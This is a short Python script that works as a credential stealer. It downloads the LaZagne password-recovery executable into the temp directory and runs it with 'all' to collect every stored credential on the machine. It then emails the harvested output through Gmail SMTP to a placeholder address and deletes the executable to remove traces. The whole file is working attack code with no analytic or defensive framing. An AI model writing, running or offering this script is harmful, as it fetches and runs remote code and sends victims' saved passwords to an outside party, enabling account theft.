import subprocess

import requests, os, tempfile, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as output_file:
        output_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe") 
# or check for latest Version of Lazagne
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("<email>", "<app password>", result)
os.remove("laZagne.exe")



